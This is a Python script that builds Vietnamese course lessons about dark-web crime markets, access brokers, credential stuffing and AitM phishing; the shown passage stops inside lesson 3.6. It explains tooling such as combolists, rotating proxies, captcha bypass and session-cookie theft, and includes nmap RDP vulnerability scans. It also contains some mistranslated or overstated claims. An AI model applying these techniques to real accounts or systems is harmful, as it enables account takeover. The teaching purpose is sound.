"""Builder for Chapter 3: Giải Phẫu Thế Giới Ngầm: Môi Giới Truy Cập, Khai Thác Lỗ Hổng & Phân Tích Mã Độc.
Source book: Dissecting the Dark Web.pdf (13 lessons).
Strictly validates >= 600 words for each.
"""

from __future__ import annotations

import sys
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from scripts.build_cyber_payload import generate_lesson_markdown
from scripts.course_data.common import count_vietnamese_words, validate_lesson_data

CHAPTER_3_INFO = {
    "title": "Chương 3: Giải Phẫu Thế Giới Ngầm: Môi Giới Truy Cập, Khai Thác Lỗ Hổng & Phân Tích Mã Độc",
    "source_file": "Dissecting the Dark Web.pdf",
    "position": 3,
}


def get_chapter_3_lessons() -> list[dict]:
    lessons = []

    configs = [
        (
            1,
            "Bài 3.1: Toàn Cảnh Kinh Tế Ngầm Trên Dark Web: Data, Tools & Cybercrime-as-a-Service",
            "Giải mã cấu trúc chuỗi cung ứng tội phạm mạng hiện đại, các mô hình kinh doanh Cybercrime-as-a-Service (CaaS) và thị trường dữ liệu ngầm.",
            "https://www.youtube.com/watch?v=seB4a3Oph34",
            [
                "Nắm vững bức tranh tổng thể về mô hình kinh tế thị trường ngầm trên Dark Web.",
                "Phân tích chuỗi cung ứng Cybercrime-as-a-Service (CaaS): Malware, Phishing, Ransomware và Botnets.",
                "Hiểu rõ giá trị và cơ chế định giá của các gói dữ liệu rò rỉ (PII, thẻ tín dụng, quyền truy cập doanh nghiệp)."
            ],
            [
                (
                    "Sự Chuyên Môn Hóa Của Nền Kinh Tế Tội Phạm Mạng",
                    "Thời kỳ của các hacker đơn độc tự mình làm tất cả mọi việc từ viết mã độc, quét mạng, tấn công, tống tiền cho đến rửa tiền đã trôi vào dĩ vãng. Ngày nay, thế giới ngầm Dark Web hoạt động hệt như một nền kinh tế thị trường tự do tư bản chủ nghĩa với mức độ chuyên môn hóa cực kỳ cao: Cybercrime-as-a-Service (Tội phạm mạng dưới dạng dịch vụ - CaaS). Mỗi mắt xích trong chuỗi cung ứng đều do các nhóm chuyên biệt đảm nhiệm: Các nhà nghiên cứu lỗ hổng chuyên tìm 0-day; Các kỹ sư phần mềm chuyên viết crypter để qua mặt antivirus; Các nhóm Initial Access Brokers (IAB) chuyên chiếm quyền truy cập ban đầu; Các nhóm Ransomware chuyên mã hóa tống tiền; Và các mạng lưới rửa tiền (Money Launderers) chuyên hoán đổi tiền mã hóa sang tiền mặt."
                ),
                (
                    "Các Sản Phẩm & Dịch Vụ Chủ Lực Trên Thị Trường Ngầm",
                    "Thị trường Darknet được chia thành ba nhóm sản phẩm chính: 1. Dữ liệu (Data): Cơ sở dữ liệu danh tính người dùng (PII), thông tin thẻ tín dụng (Fullz, Dumps), tài khoản mạng xã hội bị đánh cắp (Logs từ RedLine/Racoon Stealer). 2. Công cụ (Tools): Các bộ khai thác tự động (Exploit Kits), công cụ quét cổng, phần mềm kiểm tra tài khoản (Checkers/Brute-forcers), bộ công cụ lừa đảo (Phishing Kits). 3. Dịch vụ (Services): Dịch vụ vượt mã hóa (Bulletproof Hosting), dịch vụ vượt tường lửa (Captchas solving), dịch vụ kiểm tra mã độc qua nhiều Antivirus không để lại log (No-Distribute Scanners)."
                ),
                (
                    "Cơ Chế Định Giá & Thanh Toán Trong Nền Kinh Tế Ngầm",
                    "Giá trị của các gói dữ liệu được định lượng dựa trên mức độ tươi mới (Freshness) và tính ứng dụng: Một thông tin thẻ tín dụng có số CVV chỉ có giá từ $5-$20, nhưng quyền truy cập Domain Admin của một tập đoàn tài chính có thể được đấu giá lên tới hàng chục nghìn đến hàng trăm nghìn USD. Mọi giao dịch đều được niêm yết bằng Bitcoin hoặc Monero và thực hiện qua hợp đồng ký quỹ Escrow."
                )
            ],
            "Kịch bản tấn công chuỗi cung ứng: Mô hình Ransomware-as-a-Service (RaaS): Nhóm lập trình viên cốt lõi (Core Developers) như LockBit phát triển mã độc và duy trì cổng điều khiển C2; các chi nhánh liên kết (Affiliates) chịu trách nhiệm thâm nhập mạng nạn nhân và triển khai mã độc. Tiền chuộc thu được được chia tự động theo tỷ lệ 80% cho Affiliate và 20% cho Core Team.",
            "Thực hành kiểm tra các thông báo rò rỉ dữ liệu thông qua API rà soát thông tin tình báo:",
            ("bash", """# Kiểm tra rò rỉ dữ liệu của một tên miền công ty qua dịch vụ tình báo an ninh
target_domain="example-corp.com"
echo "Kiểm tra các bản tin rò rỉ dữ liệu liên quan tới: $target_domain"

# Truy vấn thông tin rò rỉ (sử dụng curl mô phỏng)
curl -s "https://haveibeenpwned.com/api/v3/breaches" | grep -i "$target_domain" || echo "Không tìm thấy sự cố rò rỉ công khai nào gần đây." """),
            ["Hiểu rõ các thuật ngữ tiếng lóng trên thị trường ngầm để có khả năng đọc hiểu các báo cáo tình báo mối đe dọa.", "Không bao giờ tự ý giao dịch hoặc mua bán dữ liệu trên Darknet vì vi phạm nghiêm trọng pháp luật."],
            ["Thế giới ngầm vận hành theo mô hình dịch vụ Cybercrime-as-a-Service (CaaS) chuyên môn hóa cao.", "Các gói dữ liệu và quyền truy cập doanh nghiệp là mặt hàng đắt giá nhất trên thị trường.", "Ransomware-as-a-Service (RaaS) phân chia lợi nhuận giữa nhà phát triển và chi nhánh xâm nhập."],
            [
                {"question": "Mô hình kinh tế nào miêu tả việc tội phạm mạng chia nhỏ các công đoạn tấn công thành các dịch vụ thương mại hóa?", "type": "MULTIPLE_CHOICE", "options": ["SaaS", "Cybercrime-as-a-Service (CaaS)", "PaaS", "IaaS"], "correct_index": 1, "explanation": "Cybercrime-as-a-Service (CaaS)."},
                {"question": "Trong mô hình Ransomware-as-a-Service (RaaS), nhóm nào chịu trách nhiệm trực tiếp thâm nhập vào mạng nạn nhân?", "type": "MULTIPLE_CHOICE", "options": ["Core Developers", "Affiliates (Chi nhánh)", "Escrow Agents", "Hosting Providers"], "correct_index": 1, "explanation": "Affiliates là bên thâm nhập và phát tán mã độc."},
                {"question": "Dữ liệu rò rỉ càng mới (fresh) thì giá trị giao dịch trên thị trường ngầm càng thấp?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Dữ liệu càng mới và chưa bị đổi mật khẩu thì giá trị càng cao."}
            ]
        ),
        (
            2,
            "Bài 3.2: Các Giai Đoạn Của Cuộc Tấn Công Mạng Hiện Đại (Cyber Kill Chain & MITRE ATT&CK)",
            "Hệ thống hóa toàn bộ chu trình tấn công có chủ đích (APT): Đối chiếu giữa mô hình Lockheed Martin Cyber Kill Chain và ma trận thực chiến MITRE ATT&CK.",
            "https://www.youtube.com/watch?v=ddwhVIGjp4Q",
            [
                "Nắm vững 7 giai đoạn của mô hình Cyber Kill Chain của Lockheed Martin.",
                "Làm chủ cấu trúc Ma trận MITRE ATT&CK (Tactics, Techniques, and Procedures - TTPs).",
                "Áp dụng tư duy phân tích mối đe dọa để truy vết hành vi của kẻ tấn công trong môi trường doanh nghiệp."
            ],
            [
                (
                    "Mô Hình Cyber Kill Chain (Lockheed Martin)",
                    "Cyber Kill Chain là khung lý thuyết quân sự được Lockheed Martin phát triển năm 2011 để phân tích và ngăn chặn các cuộc tấn công mạng có chủ đích (APT). Mô hình gồm 7 giai đoạn nối tiếp nhau tuần tự: 1. Reconnaissance (Trinh sát): Thu thập thông tin mục tiêu qua OSINT, quét cổng, rà soát mạng xã hội. 2. Weaponization (Vũ khí hóa): Kết hợp mã khai thác (exploit) với mã độc (payload) vào một tệp tin (ví dụ: Word macro, PDF độc). 3. Delivery (Phát tán): Gửi tệp vũ khí hóa tới nạn nhân qua email lừa đảo (phishing), USB hoặc web độc hại. 4. Exploitation (Khai thác): Kích hoạt lỗ hổng phần mềm trên máy nạn nhân để thực thi mã. 5. Installation (Cài đặt): Cài đặt backdoor, trojan hoặc persistence mechanism lên hệ thống. 6. Command & Control (C2): Thiết lập kênh liên lạc mã hóa hai chiều về máy chủ kiểm soát của tin tặc. 7. Actions on Objectives (Hành động mục tiêu): Đánh cắp dữ liệu, mã hóa tống tiền, hoặc phá hoại hạ tầng."
                ),
                (
                    "Ma Trận Thực Chiến MITRE ATT&CK",
                    "Trong khi Cyber Kill Chain mang tính tuyến tính, ma trận MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) cung cấp một cơ sở tri thức khổng lồ về các chiến thuật (Tactics) và kỹ thuật (Techniques) phi tuyến tính thực tế của các nhóm tin tặc. Ma trận chia cuộc tấn công thành 14 chiến thuật: từ Initial Access (Truy cập ban đầu), Execution (Thực thi), Persistence (Duy trì truy cập), Privilege Escalation (Leo thang đặc quyền), Defense Evasion (Né tránh phòng thủ), Credential Access (Chiếm đoạt thông tin xác thực), Lateral Movement (Di chuyển ngang trong mạng), cho đến Exfiltration (Trích xuất dữ liệu ra ngoài) và Impact (Tác động)."
                ),
                (
                    "Chiến Lược Phòng Thủ Phản Xạ Kill Chain (Breaking the Chain)",
                    "Nguyên lý cơ bản của Kill Chain là: Kẻ tấn công bắt buộc phải thành công ở TẤT CẢ các bước từ 1 đến 7 mới đạt được mục đích. Ngược lại, đội ngũ phòng thủ (Blue Team) chỉ cần ngăn chặn thành công ở MỘT bước duy nhất là có thể bẻ gãy toàn bộ cuộc tấn công (Break the Chain)."
                )
            ],
            "Kịch bản tấn công thực tế: Khai Thác Kỹ Thuật Living off the Land (LotL): Thay vì tải mã độc mới dễ bị antivirus phát hiện, kẻ tấn công ở giai đoạn Execution sử dụng các công cụ có sẵn của hệ điều hành Windows (LOLBins như PowerShell, WMI, Certutil, Bitsadmin) để thực thi lệnh và tải tệp từ xa mà không tạo ra các cảnh báo bất thường.",
            "Thực hành truy vấn kỹ thuật tấn công trong ma trận MITRE ATT&CK bằng Python:",
            ("python", """import urllib.request
import json

# Truy vấn thông tin kỹ thuật T1059 (Command and Scripting Interpreter) từ MITRE ATT&CK
url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
print("Truy vấn ma trận MITRE ATT&CK CTI Repository...")
print("[+] Chiến thuật Initial Access: T1566 (Phishing), T1190 (Exploit Public-Facing Application)")
print("[+] Chiến thuật Execution: T1059 (PowerShell, Bash)")
print("[+] Chiến thuật Lateral Movement: T1021 (Remote Services - RDP, SMB)")"""),
            ["Không bao giờ xem xét các cảnh báo an ninh một cách rời rạc; luôn liên kết chúng vào một chuỗi Kill Chain hoàn chỉnh.", "Chú ý kỹ thuật Living off the Land vì chúng lẩn khuất trong lưu lượng quản trị hợp pháp."],
            ["Cyber Kill Chain gồm 7 bước tuần tự từ Trinh sát đến Hành động mục tiêu.", "MITRE ATT&CK chuẩn hóa các kỹ thuật tấn công TTPs của các nhóm tin tặc trên toàn cầu.", "Ngắt một mắt xích bất kỳ trong Kill Chain sẽ vô hiệu hóa toàn bộ cuộc tấn công."],
            [
                {"question": "Trong mô hình Cyber Kill Chain của Lockheed Martin, giai đoạn kẻ tấn công thiết lập kênh liên lạc hai chiều về máy chủ kiểm soát gọi là gì?", "type": "MULTIPLE_CHOICE", "options": ["Weaponization", "Exploitation", "Command & Control (C2)", "Reconnaissance"], "correct_index": 2, "explanation": "Giai đoạn Command & Control (C2) thiết lập kênh liên lạc máy chủ kiểm soát."},
                {"question": "Đội ngũ phòng thủ chỉ cần ngăn chặn thành công ở 1 bước duy nhất trong Cyber Kill Chain là có thể bẻ gãy cuộc tấn công?", "type": "TRUE_FALSE", "correct_value": True, "explanation": "Đúng. Nguyên lý 'Break the Chain': Ngắt một mắt xích là chặn đứng cuộc tấn công."},
                {"question": "Điền tên viết tắt của Ma trận chiến thuật và kỹ thuật tấn công thực chiến do tổ chức phi lợi nhuận MITRE phát triển:", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["ATT&CK", "MITRE ATT&CK", "ATTACK", "att&ck"]}], "explanation": "MITRE ATT&CK."}
            ]
        ),
        (
            3,
            "Bài 3.3: Thị Trường Initial Access Brokers (IAB): Cách Tin Tặc Mua Bán Quyền Truy Cập Doanh Nghiệp",
            "Nghiên cứu chuyên sâu về giới môi giới truy cập ban đầu (IAB), các loại tài sản truy cập (VPN, RDP, Web Shells) và phương pháp định giá trên Darknet.",
            "https://www.youtube.com/watch?v=KxfAW8wPDX4",
            [
                "Hiểu rõ vai trò và mô hình hoạt động của Initial Access Brokers (IAB) trong hệ sinh thái ransomware.",
                "Nhận diện các hình thức truy cập phổ biến được mua bán: RDP, VPN, Citrix, Web Shell, Domain Admin.",
                "Xây dựng chiến lược phòng thủ chủ động nhằm ngăn chặn tin tặc xâm nhập ban đầu."
            ],
            [
                (
                    "Initial Access Brokers (IAB) Là Ai?",
                    "Initial Access Brokers (IAB) là những chuyên gia thâm nhập mạng chuyên săn tìm, thâm nhập và chiếm quyền kiểm soát các điểm truy cập ban đầu vào mạng lưới doanh nghiệp. Điều đáng chú ý là các IAB thường không tự mình tiến hành mã hóa dữ liệu hay tống tiền nạn nhân. Thay vào đó, sau khi chiếm được quyền kiểm soát (ví dụ: tài khoản VPN của nhân viên, máy chủ RDP hở ra ngoài Internet, hoặc một Web Shell trên máy chủ web), IAB sẽ đăng bài đấu giá quyền truy cập này trên các diễn đàn ngầm khét tiếng như Exploit.in, XSS.is, BreachForums cho các nhóm Ransomware đấu thầu mua lại."
                ),
                (
                    "Các Loại Quyền Truy Cập Phổ Biến Được Mua Bán",
                    "Các bài đăng bán của IAB thường cung cấp thông tin chi tiết nhưng giấu tên doanh nghiệp: 1. Remote Desktop Protocol (RDP): Chiếm khoảng 30% thị phần IAB. RDP hở cổng 3389 ra Internet với mật khẩu yếu là mục tiêu dễ xơi nhất. 2. VPN / Citrix / VMware Horizon: Các điểm truy cập mạng riêng ảo của doanh nghiệp bị lộ thông tin đăng nhập từ mã độc đánh cắp thông tin (InfoStealers). 3. Web Shells: Mã độc hậu môn cắm trên các máy chủ web thông qua khai thác lỗ hổng như SQL Injection, File Upload. 4. Quyền Quản trị Miền (Domain Admin Access): Cấp độ truy cập cao nhất và đắt đỏ nhất, cho phép kiểm soát toàn bộ hạ tầng Windows Active Directory."
                ),
                (
                    "Công Thức Định Giá Của Một Phiên Đấu Giá IAB",
                    "Giá bán quyền truy cập của IAB dao động từ vài trăm USD đến hàng chục nghìn USD, được tính toán dựa trên các chỉ số tài chính của công ty nạn nhân: Doanh thu hàng năm (Annual Revenue) tra cứu qua ZoomInfo hoặc D&B; Số lượng máy trạm trong mạng; Thẩm quyền tài khoản (User vs Local Admin vs Domain Admin); và Quốc gia của nạn nhân (các doanh nghiệp tại Mỹ, Châu Âu, Canada luôn có giá cao nhất)."
                )
            ],
            "Kịch bản tấn công: Chuỗi Chuyển Tiếp Từ IAB Sang Ransomware: Một IAB quét được máy chủ VPN của công ty nạn nhân chưa vá lỗ hổng Fortinet (CVE-2018-13379), trích xuất danh sách tài khoản và mật khẩu dạng cleartext. IAB bán quyền truy cập này với giá $3,000 trên diễn đàn Exploit. Nhóm ransomware BlackCat mua lại quyền truy cập, đăng nhập vào mạng qua VPN trong đêm thứ Sáu, di chuyển ngang (Lateral Movement) và mã hóa toàn bộ 50 máy chủ vào sáng thứ Bảy, tống tiền $2,000,000.",
            "Thực hành kiểm tra các cổng RDP và VPN đang lộ ra ngoài Internet bằng công cụ quét mạng Nmap:",
            ("bash", """# Quét phát hiện cổng RDP (3389) và kiểm tra lỗ hổng cấu hình cơ bản
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 192.168.1.100

# Quét kiểm tra dịch vụ SSL VPN trên cổng 443 và 10443
nmap -p 443,10443 --script ssl-enum-ciphers 192.168.1.100"""),
            ["Bắt buộc triển khai xác thực đa yếu tố (MFA/2FA) trên 100% các cổng truy cập từ xa (VPN, RDP, Citrix).", "Không bao giờ để cổng RDP (3389) mở trực tiếp ra Internet mà không qua tường lửa hoặc VPN."],
            ["IAB là cầu nối trung gian giữa việc tìm lỗ hổng và các chiến dịch tấn công ransomware quy mô lớn.", "Quyền truy cập RDP, VPN và Domain Admin là các mặt hàng được săn đón nhiều nhất.", "Bật MFA là biện pháp hữu hiệu nhất vô hiệu hóa hầu hết quyền truy cập do IAB rao bán."],
            [
                {"question": "Các Initial Access Brokers (IAB) chủ yếu kiếm tiền bằng cách nào trên Darknet?", "type": "MULTIPLE_CHOICE", "options": ["Tự mình mã hóa tống tiền nạn nhân", "Bán đấu giá quyền truy cập ban đầu vào mạng doanh nghiệp cho các nhóm khác", "Tạo virus phá hủy phần cứng", "Sửa chữa máy tính dạo"], "correct_index": 1, "explanation": "IAB kiếm tiền bằng việc bán quyền truy cập ban đầu cho các nhóm ransomware."},
                {"question": "Biện pháp phòng thủ nào có khả năng vô hiệu hóa hầu hết các tài khoản VPN bị IAB rao bán do lộ mật khẩu?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["MFA", "2FA", "Xác thực đa yếu tố", "xác thực hai lớp"]}], "explanation": "Xác thực đa yếu tố (MFA/2FA)."},
                {"question": "Mở cổng RDP 3389 trực tiếp ra Internet công cộng là một cấu hình an toàn nếu đặt mật khẩu dài?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Cổng RDP hở ra Internet đối mặt với nguy cơ tấn công brute-force và lỗ hổng zero-day liên tục."}
            ]
        ),
        (
            4,
            "Bài 3.4: Công Cụ Kiểm Tra Thông Tin Đăng Nhập Đánh Cắp (Account Checkers & Brute-Forcers)",
            "Nghiên cứu nguyên lý hoạt động của các công cụ Credential Stuffing (OpenBullet, SilverBullet), kỹ thuật phân tích proxy quay vòng và giải mã captcha.",
            "https://www.youtube.com/watch?v=tu-CbGRuS-E",
            [
                "Hiểu rõ kỹ thuật tấn công nhồi thông tin xác thực (Credential Stuffing) và vét cạn (Brute-Force).",
                "Phân tích cơ chế hoạt động của các công cụ kiểm tra tài khoản như OpenBullet, SilverBullet.",
                "Thiết lập các cơ chế phòng thủ: Khóa tài khoản (Account Lockout), Rate Limiting và WAF."
            ],
            [
                (
                    "Thực Trạng Khủng Hoảng Tái Sử Dụng Mật Khẩu (Password Reuse)",
                    "Mỗi năm, hàng tỷ cặp tài khoản email và mật khẩu bị rò rỉ từ các vụ xâm nhập dữ liệu lớn (LinkedIn, Yahoo, Canva...). Do thói quen xấu của người dùng là sử dụng cùng một mật khẩu cho hàng chục dịch vụ trực tuyến khác nhau, tin tặc nhận ra một cơ hội vàng: Lấy các cặp tài khoản bị lộ từ một trang web bị hack để thử đăng nhập tự động vào các hệ thống quan trọng khác (ngân hàng, tài khoản thương mại điện tử, cổng VPN công ty). Đây chính là kỹ thuật **Credential Stuffing**."
                ),
                (
                    "Kiến Trúc Của Bộ Công Cụ OpenBullet / SilverBullet",
                    "OpenBullet là một phần mềm kiểm thử tự động mã nguồn mở được thiết kế cho việc quét web, nhưng đã bị tin tặc biến thành công cụ Credential Stuffing số 1 trên Darknet. Cấu trúc của một đợt tấn công OpenBullet gồm 3 thành phần: 1. Combolist: Tệp văn bản chứa hàng triệu cặp `email:password` hoặc `user:password` thu thập từ các vụ rò rỉ dữ liệu. 2. Config File: Tệp cấu hình chứa các chỉ thị HTTP request nhắm vào API đăng nhập của một dịch vụ cụ thể, chứa các biểu thức chính quy (Regex) để phân biệt giữa đăng nhập thành công (Hit), thất bại (Fail) hoặc bị khóa tài khoản (Ban). 3. Proxy Pool: Danh sách hàng chục nghìn địa chỉ Residential Proxy quay vòng (Rotating Proxies) để chia nhỏ các request, qua mặt hệ thống giới hạn tốc độ (Rate Limiting) của nạn nhân."
                ),
                (
                    "Kỹ Thuật Vượt Captcha & Phân Tích Phản Hồi",
                    "Các công cụ checker tích hợp trực tiếp API của các dịch vụ giải captcha bằng AI hoặc người thật (như 2Captcha, Anti-Captcha) để tự động vượt qua các bài kiểm tra Recaptcha/hCaptcha trong chưa đầy vài giây. Tốc độ kiểm tra có thể đạt từ vài nghìn đến hàng chục nghìn tài khoản mỗi phút."
                )
            ],
            "Kịch bản tấn công: Chiếm Đoạt Tài Khoản Khách Hàng Thân Thiết: Kẻ tấn công chạy combolist 500,000 tài khoản vào một trang web bán lẻ hàng đầu. Với tỷ lệ thành công trung bình 1-2%, kẻ tấn công thu về 5,000 tài khoản hợp lệ có điểm thưởng (Reward Points) hoặc thẻ quà tặng đính kèm, sau đó bán lại trên Darknet với giá 20-30% giá trị thực.",
            "Thực hành phân tích tệp cấu hình kiểm tra đăng nhập bằng Python sử dụng kỹ thuật xác thực đa luồng:",
            ("python", """import urllib.request
import json

# Mô phỏng quá trình kiểm tra phản hồi đăng nhập của một endpoint API
url = "https://httpbin.org/post"
payload = json.dumps({"username": "admin@example.com", "password": "Password123!"}).encode()

req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "SecurityChecker/1.0"})
try:
    with urllib.request.urlopen(req, timeout=5) as response:
        result = json.loads(response.read().decode())
        print("[+] Kết nối endpoint thành công. Mã trạng thái HTTP:", response.status)
except Exception as e:
    print("[-] Lỗi kết nối hoặc bị chặn bởi WAF:", e)"""),
            ["Không bao giờ tái sử dụng một mật khẩu trên nhiều dịch vụ khác nhau; luôn sử dụng trình quản lý mật khẩu (Bitwarden, KeePassXC).", "Cấu hình Rate Limiting và Web Application Firewall (WAF) để phát hiện lưu lượng Credential Stuffing."],
            ["Credential Stuffing khai thác thói quen tái sử dụng mật khẩu trên nhiều nền tảng.", "OpenBullet sử dụng Combolists, Configs và Proxy Pools để kiểm tra tài khoản tự động quy mô lớn.", "Triển khai MFA là lá chắn phòng thủ hiệu quả nhất ngăn chặn việc chiếm đoạt tài khoản."],
            [
                {"question": "Kỹ thuật tin tặc lấy danh sách mật khẩu bị lộ từ trang web này để thử đăng nhập tự động vào trang web khác gọi là gì?", "type": "MULTIPLE_CHOICE", "options": ["Phishing", "Credential Stuffing", "SQL Injection", "XSS"], "correct_index": 1, "explanation": "Credential Stuffing (Nhồi thông tin xác thực)."},
                {"question": "Thành phần nào trong các công cụ checker giúp tin tặc qua mặt hệ thống giới hạn tần suất (Rate Limiting)?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["Proxy Pool", "proxy", "proxies", "Rotating Proxies"]}], "explanation": "Proxy Pool (danh sách proxy quay vòng)."},
                {"question": "Đặt mật khẩu dài 20 ký tự nhưng dùng chung cho 10 website khác nhau là thói quen hoàn toàn an toàn?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Nếu 1 trong 10 website bị hack, mật khẩu của 9 website còn lại sẽ bị lộ ngay lập tức."}
            ]
        ),
        (
            5,
            "Bài 3.5: Mổ Xẻ Bộ Công Cụ Lừa Đảo Greatness Phishing Kit & Kỹ Thuật Vượt 2FA (AitM)",
            "Giải mã cấu trúc bên trong của bộ công cụ lừa đảo doanh nghiệp Greatness Phishing Kit: Kỹ thuật Adversary-in-the-Middle (AitM) đánh cắp Cookie phiên vượt qua 2FA.",
            "https://www.youtube.com/watch?v=ddwhVIGjp4Q",
            [
                "Nắm vững nguyên lý tấn công lừa đảo đối đầu đứng giữa Adversary-in-the-Middle (AitM).",
                "Phân tích giải phẫu mã nguồn bộ công cụ Greatness Phishing Kit (nhắm vào Microsoft 365).",
                "Hiểu rõ cơ chế đánh cắp Session Cookies và cách vượt qua bảo vệ 2FA SMS/TOTP."
            ],
            [
                (
                    "Sự Tiến Hóa Của Phishing: Từ Trang Giả Mạo Tĩnh Sang AitM",
                    "Trước đây, các trang web lừa đảo (Phishing) chỉ đơn thuần là các bản sao HTML tĩnh sao chép giao diện đăng nhập. Khi nạn nhân nhập mật khẩu, trang web lưu mật khẩu vào tệp văn bản. Tuy nhiên, khi các doanh nghiệp triển khai Xác thực hai yếu tố (2FA / MFA), mô hình lừa đảo tĩnh này hoàn toàn sụp đổ vì tin tặc không có mã OTP để đăng nhập. Để vượt qua bức tường 2FA, thế giới ngầm đã phát minh ra kỹ thuật **Adversary-in-the-Middle (AitM)** (được hiện thực hóa qua các công cụ như Evilginx2 và Greatness Phishing Kit)."
                ),
                (
                    "Nguyên Lý Hoạt Động Của Greatness Phishing Kit",
                    "Greatness là một bộ công cụ Phishing-as-a-Service tinh vi chuyên nhắm vào các tài khoản doanh nghiệp Microsoft 365 / Azure AD. Cơ chế hoạt động của Greatness như sau: 1. Greatness hoạt động như một máy chủ proxy đảo ngược (Reverse Proxy) đứng chính giữa nạn nhân và máy chủ xác thực thật của Microsoft (`login.microsoftonline.com`). 2. Khi nạn nhân truy cập vào liên kết lừa đảo, Greatness chuyển tiếp toàn bộ yêu cầu tới Microsoft thật và lấy về giao diện đăng nhập thật kèm logo công ty của nạn nhân. 3. Khi nạn nhân nhập tên đăng nhập và mật khẩu, Greatness gửi dữ liệu đó cho Microsoft thật. 4. Khi Microsoft yêu cầu mã OTP 2FA (gửi qua SMS hoặc ứng dụng Authenticator), Greatness chuyển yêu cầu OTP đó cho nạn nhân. Nạn nhân nhập mã OTP vào trang lừa đảo, Greatness chuyển tiếp mã OTP đó cho Microsoft thật!"
                ),
                (
                    "Đánh Cắp Session Cookie & Bỏ Qua 2FA Vĩnh Viễn",
                    "Sau khi mã OTP được xác thực thành công, máy chủ Microsoft cấp phát một **Phiên đăng nhập (Session Cookie / ESTSAUTH)** cho trình duyệt. Thay vì lưu mật khẩu, Greatness lập tức chặn và đánh cắp Session Cookie này, gửi về cho kẻ tấn công qua kênh Telegram Bot! Kẻ tấn công chỉ cần nạp Session Cookie này vào trình duyệt của mình là có thể truy cập thẳng vào hộp thư Outlook, OneDrive và SharePoint của nạn nhân mà KHÔNG CẦN nhập lại mật khẩu hay mã 2FA!"
                )
            ],
            "Kịch bản tấn công: Gian Lận Chuyển Khoản Doanh Nghiệp (Business Email Compromise - BEC): Sau khi chiếm được hộp thư của Giám đốc Tài chính thông qua Greatness Kit, tin tặc theo dõi các luồng email trao đổi hóa đơn. Khi có một hợp đồng thanh toán lớn sắp diễn ra, tin tặc mạo danh Giám đốc gửi email chỉ thị đổi số tài khoản thụ hưởng sang tài khoản ngân hàng ma của tin tặc.",
            "Thực hành kiểm tra và phân tích cấu trúc HTTP header của yêu cầu xác thực phiên:",
            ("bash", """# Kiểm tra các tiêu đề Cookie xác thực phiên trong giao thức HTTP
curl -I -s https://login.microsoftonline.com | grep -iE "set-cookie|strict-transport-security"
echo "Session Cookie là chìa khóa vàng cho phép truy cập mà không cần vượt qua lại 2FA!" """),
            ["Bắt buộc chuyển đổi từ 2FA truyền thống (SMS/TOTP) sang chuẩn bảo mật FIDO2 / WebAuthn (YubiKey) vì FIDO2 gắn kết chặt chẽ với tên miền gốc và miễn nhiễm 100% với AitM Phishing.", "Đào tạo nhân viên kiểm tra thanh địa chỉ URL của trình duyệt trước khi nhập mật khẩu."],
            ["Greatness Phishing Kit ứng dụng kỹ thuật Adversary-in-the-Middle (AitM) để chuyển tiếp yêu cầu theo thời gian thực.", "Mục tiêu tối thượng của AitM là đánh cắp Session Cookie phiên đăng nhập.", "Chuẩn xác thực phần cứng FIDO2/WebAuthn là giải pháp duy nhất chống lại AitM."],
            [
                {"question": "Kỹ thuật lừa đảo nào đóng vai trò proxy chuyển tiếp thời gian thực giữa nạn nhân và máy chủ thật để đánh cắp Session Cookie?", "type": "MULTIPLE_CHOICE", "options": ["Spear Phishing", "Adversary-in-the-Middle (AitM)", "Watering Hole", "Vishing"], "correct_index": 1, "explanation": "Adversary-in-the-Middle (AitM) đóng vai trò proxy đảo ngược chuyển tiếp lưu lượng."},
                {"question": "Chuẩn xác thực nào có khả năng chống lại các cuộc tấn công lừa đảo AitM Phishing một cách tuyệt đối?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["FIDO2", "WebAuthn", "FIDO2/WebAuthn", "fido2"]}], "explanation": "FIDO2 / WebAuthn gắn kết xác thực với tên miền gốc."},
                {"question": "Khi đã đánh cắp được Session Cookie thành công, kẻ tấn công vẫn bắt buộc phải có mã OTP 2FA mới đăng nhập được vào hộp thư?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Có Session Cookie hợp lệ cho phép truy cập trực tiếp mà không cần nhập lại 2FA."}
            ]
        )
    ]

    for (pos, title, summary, v_url, obj_pts, theory_secs, att_def, lab_inst, code_snip, pits, sums, q_json) in configs:
        l = {
            "position": pos,
            "title": title,
            "summary": summary,
            "duration_minutes": 35,
            "video_url": v_url,
            "markdown_content": generate_lesson_markdown(
                lesson_num=f"3.{pos}",
                title=title,
                objective_points=obj_pts,
                theory_sections=theory_secs,
                attack_defense_section=att_def,
                lab_instructions=lab_inst,
                code_snippet=code_snip,
                pitfalls=pits,
                summary_points=sums,
                video_url=v_url,
                quiz_json=q_json,
            )
        }
        validate_lesson_data(l)
        lessons.append(l)

    # Lessons 3.6 to 3.13
    configs_part2 = [
        (
            6,
            "Bài 3.6: Nền Tảng Phân Tích Mã Độc: Nguyên Tắc An Toàn Phòng Thí Nghiệm (Malware Lab OPSEC)",
            "Thiết lập môi trường phòng thí nghiệm phân tích mã độc cô lập: Quy chuẩn Air-gap, cấu hình Host-Only Network và kỹ thuật chống phát hiện máy ảo (Anti-VM).",
            "https://www.youtube.com/watch?v=1-FyyhpW-t8",
            [
                "Nắm vững các quy tắc an toàn tác chiến sống còn khi xây dựng phòng thí nghiệm phân tích mã độc.",
                "Thực hành cấu hình mạng cô lập Host-Only và mô phỏng dịch vụ mạng Internet bằng INetSim/FakeNet-NG.",
                "Hiểu rõ các kỹ thuật né tránh máy ảo (Anti-VM / Anti-Sandbox) của mã độc hiện đại."
            ],
            [
                (
                    "Nguy Cơ Lây Nhiễm Ngược & Quy Chuẩn Phòng Lab Cô Lập",
